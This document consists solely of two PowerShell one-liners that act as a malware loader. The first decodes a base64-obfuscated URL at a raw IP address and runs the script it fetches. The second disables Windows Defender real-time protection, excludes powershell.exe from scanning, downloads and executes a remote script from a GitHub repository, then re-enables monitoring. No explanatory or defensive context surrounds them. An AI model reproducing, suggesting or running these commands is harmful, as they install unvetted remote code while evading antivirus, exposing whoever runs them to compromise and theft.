iex(irm ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovLzE5My4yMzMuMTI2LjI6ODA4MS93b3JrZXI/PWRlZ28='))))
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionProcess 'powershell.exe'; irm https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dega.ps1 | iex; Set-MpPreference -DisableRealtimeMonitoring $false"
